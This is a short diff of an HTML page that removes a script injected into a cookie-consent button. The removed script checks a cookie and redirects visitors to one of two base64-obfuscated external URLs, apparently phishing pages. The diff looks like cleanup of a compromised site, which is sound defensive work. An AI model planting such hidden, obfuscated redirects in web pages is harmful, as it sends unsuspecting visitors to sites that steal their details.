@@ -162,19 +162,5 @@
             acceptButton.addEventListener('click', handleConsent);
             declineButton.addEventListener('click', handleConsent);
         });
-document.querySelector("#buttons-cookie").addEventListener("click", function() {
-    function getCookie(name) {
-        const matches = document.cookie.match(new RegExp(
-            "(?:^|; )" + name.replace(/([.$?*|{}()[]\/+^])/g, '\\$1') + "=([^;]*)"
-        ));
-        return matches ? decodeURIComponent(matches[1]) : null;
-    }
-    if (getCookie("b4e6f4f261da74dc0912f747852a0f92")) {
-        window.location.href = atob("aHR0cHM6Ly83MXl4NGs2MTdmdDNwemp1bDExYW4yeDEuejE5LndlYi5jb3JlLndpbmRvd3MubmV0");
-    } else {
-       window.location.href = atob("aHR0cHM6Ly9nZXRkZXRhaWxzZnJvbW15Y2hhcnRzLnZlcmNlbC5hcHA=");
-    }
-});
-</script>
 </body>
 </html>
